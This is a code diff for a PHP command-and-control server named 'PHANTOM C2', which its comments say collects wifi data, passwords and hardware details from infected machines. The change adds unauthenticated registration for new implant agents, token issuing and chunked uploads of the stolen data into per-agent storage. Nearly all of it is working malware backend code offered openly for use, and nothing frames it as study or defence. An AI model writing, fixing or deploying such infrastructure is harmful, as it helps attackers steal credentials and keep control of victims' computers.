@@ -2,9 +2,11 @@
 declare(strict_types=1);
 
 // ═══════════════════════════════════════════════════════════════
-// 🔥 PHANTOM C2 SERVER - v4.1
-// Added: Instant essential data collection (wifi, passwords, hardware)
-//        Permanent storage – no cleanup deletion
+// 🔥 PHANTOM C2 SERVER - v4.2
+// Fixed: Registration bootstrap circular dependency
+//        - New agents can register without a token
+//        - Existing agents cannot re-register
+//        - All other actions require authentication
 // ═══════════════════════════════════════════════════════════════
 
 $config = require __DIR__ . '/config.php';
@@ -14,10 +16,12 @@ ini_set('display_errors', '0');
 ini_set('log_errors', '1');
 
 foreach ([$config['data_dir'], $config['log_dir'], $config['upload_dir']] as $dir) {
-    if (!is_dir($dir)) mkdir($dir, 0755, true);
+    if (!is_dir($dir)) {
+        mkdir($dir, 0755, true);
+    }
 }
 
-// Database
+// ─── Database ───
 try {
     $pdo = new PDO(
         sprintf('%s:host=%s;dbname=%s;charset=%s', $config['db']['driver'], $config['db']['host'], $config['db']['database'], $config['db']['charset']),
@@ -34,7 +38,7 @@ try {
     die(json_encode(['error' => 'Database connection failed']));
 }
 
-// Tables
+// ─── Tables ───
 $pdo->exec("CREATE TABLE IF NOT EXISTS agents (
     id INT AUTO_INCREMENT PRIMARY KEY,
     agent_id VARCHAR(255) UNIQUE NOT NULL,
@@ -70,7 +74,7 @@ $pdo->exec("CREATE TABLE IF NOT EXISTS logs (
     INDEX idx_timestamp (timestamp)
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
 
-// Helpers
+// ─── Helpers ───
 function jsonResponse(array $data, int $code = 200): void {
     http_response_code($code);
     header('Content-Type: application/json');
@@ -80,7 +84,13 @@ function jsonResponse(array $data, int $code = 200): void {
 
 function logToDb(PDO $pdo, ?string $agentId, string $action, string $details = ''): void {
     $stmt = $pdo->prepare("INSERT INTO logs (agent_id, action, details, ip, user_agent, timestamp) VALUES (?, ?, ?, ?, ?, NOW())");
-    $stmt->execute([$agentId, $action, $details, $_SERVER['REMOTE_ADDR'] ?? 'unknown', $_SERVER['HTTP_USER_AGENT'] ?? 'unknown']);
+    $stmt->execute([
+        $agentId,
+        $action,
+        $details,
+        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
+        $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
+    ]);
 }
 
 function hashToken(string $token): string {
@@ -96,20 +106,31 @@ function isTokenExpired(?string $lastSeen, int $ttl): bool {
 
 function enforceUploadLimit(int $maxSize): void {
     $contentLength = (int)($_SERVER['CONTENT_LENGTH'] ?? 0);
-    if ($contentLength > $maxSize) jsonResponse(['error' => 'Upload too large'], 413);
+    if ($contentLength > $maxSize) {
+        jsonResponse(['error' => 'Upload too large'], 413);
+    }
 }
 
 function getSafeAgentDir(string $baseDir, string $agentId): string {
     $base = realpath($baseDir);
-    if ($base === false) jsonResponse(['error' => 'Data directory invalid'], 500);
+    if ($base === false) {
+        jsonResponse(['error' => 'Data directory invalid'], 500);
+    }
     
     $agentDir = $base . DIRECTORY_SEPARATOR . $agentId;
     $realAgentDir = realpath($agentDir);
+    
     if ($realAgentDir === false) {
-        if (!mkdir($agentDir, 0755, true)) jsonResponse(['error' => 'Cannot create agent directory'], 500);
+        if (!mkdir($agentDir, 0755, true)) {
+            jsonResponse(['error' => 'Cannot create agent directory'], 500);
+        }
         $realAgentDir = realpath($agentDir);
     }
-    if ($realAgentDir === false || strpos($realAgentDir, $base) !== 0) jsonResponse(['error' => 'Path traversal detected'], 403);
+    
+    if ($realAgentDir === false || strpos($realAgentDir, $base) !== 0) {
+        jsonResponse(['error' => 'Path traversal detected'], 403);
+    }
+    
     return $realAgentDir;
 }
 
@@ -119,7 +140,7 @@ $agentId = null;
 $masterKey = $config['secret_key'];
 $method = $_SERVER['REQUEST_METHOD'];
 
-// Master auth: POST body or header
+// Master auth: POST body or X-Master-Key header
 $masterKeyProvided = $_POST['key'] ?? $_SERVER['HTTP_X_MASTER_KEY'] ?? '';
 if ($masterKeyProvided !== '' && hash_equals($masterKey, $masterKeyProvided)) {
     $authType = 'master';
@@ -137,13 +158,19 @@ if (!$authType && isset($_SERVER['HTTP_X_AGENT_TOKEN'])) {
     }
 }
 
+$action = $_POST['action'] ?? $_GET['action'] ?? '';
+
+// Allow unauthenticated registration (only for new agents)
+if ($action === 'register' && $method === 'POST' && !$authType) {
+    $authType = 'registration';
+}
+
 if (!$authType) {
     logToDb($pdo, null, 'auth_failed', 'Invalid credentials');
     jsonResponse(['error' => 'Unauthorized'], 403);
 }
 
-$action = $_POST['action'] ?? $_GET['action'] ?? '';
-
+// For master, agent_id from POST body or GET
 if ($authType === 'master') {
     $agentId = $_POST['agent_id'] ?? $_GET['agent_id'] ?? '';
 }
@@ -151,25 +178,36 @@ if ($authType === 'master') {
 // ─── API Routes ───
 try {
     switch ($action) {
+
         case 'register':
             if ($method !== 'POST') jsonResponse(['error' => 'POST required'], 405);
-            if ($authType !== 'agent' && $authType !== 'master') jsonResponse(['error' => 'Forbidden'], 403);
+            
+            // Allow only unauthenticated registration or master (optional)
+            if (!in_array($authType, ['registration', 'master'], true)) {
+                jsonResponse(['error' => 'Forbidden'], 403);
+            }
             
             $input = json_decode(file_get_contents('php://input'), true) ?? [];
             $newAgentId = trim($input['agent_id'] ?? '');
             $hostname = trim($input['hostname'] ?? '');
             $os = trim($input['os'] ?? '');
+            
             if (!$newAgentId) jsonResponse(['error' => 'agent_id required'], 400);
             if (!preg_match('/^[a-zA-Z0-9\-_]+$/', $newAgentId)) jsonResponse(['error' => 'Invalid agent_id'], 400);
             
+            // Check if agent already exists
             $stmt = $pdo->prepare("SELECT agent_id FROM agents WHERE agent_id = ?");
             $stmt->execute([$newAgentId]);
-            if ($stmt->fetch()) jsonResponse(['error' => 'Agent already registered'], 409);
+            if ($stmt->fetch()) {
+                jsonResponse(['error' => 'Agent already registered'], 409);
+            }
             
             $token = bin2hex(random_bytes(32));
             $tokenHash = hashToken($token);
+            
             $stmt = $pdo->prepare("INSERT INTO agents (agent_id, token_hash, hostname, os, ip, last_seen) VALUES (?, ?, ?, ?, ?, NOW())");
             $stmt->execute([$newAgentId, $tokenHash, $hostname, $os, $_SERVER['REMOTE_ADDR']]);
+            
             logToDb($pdo, $newAgentId, 'register', 'New agent registered');
             jsonResponse(['token' => $token, 'agent_id' => $newAgentId]);
 
@@ -186,7 +224,9 @@ try {
             
             $type = $_POST['type'] ?? $_GET['type'] ?? '';
             $chunk = (int)($_POST['chunk'] ?? $_GET['chunk'] ?? 0);
-            if (!in_array($type, $config['allowed_upload_types'], true)) jsonResponse(['error' => 'Invalid upload type'], 400);
+            if (!in_array($type, $config['allowed_upload_types'], true)) {
+                jsonResponse(['error' => 'Invalid upload type'], 400);
+            }
             
             $data = file_get_contents('php://input');
             if ($data === false || empty($data)) jsonResponse(['error' => 'No data'], 400);
@@ -204,8 +244,7 @@ try {
                         unlink($f);
                     }
                 }
-                $finalFile = $agentDir . DIRECTORY_SEPARATOR . $type . '_' . time() . '.dat';
-                file_put_contents($finalFile, $merged);
+                file_put_contents($agentDir . DIRECTORY_SEPARATOR . $type . '_' . time() . '.dat', $merged);
                 logToDb($pdo, $agentId, 'upload', "Completed upload type=$type size=" . strlen($merged));
             }
             jsonResponse(['status' => 'OK']);
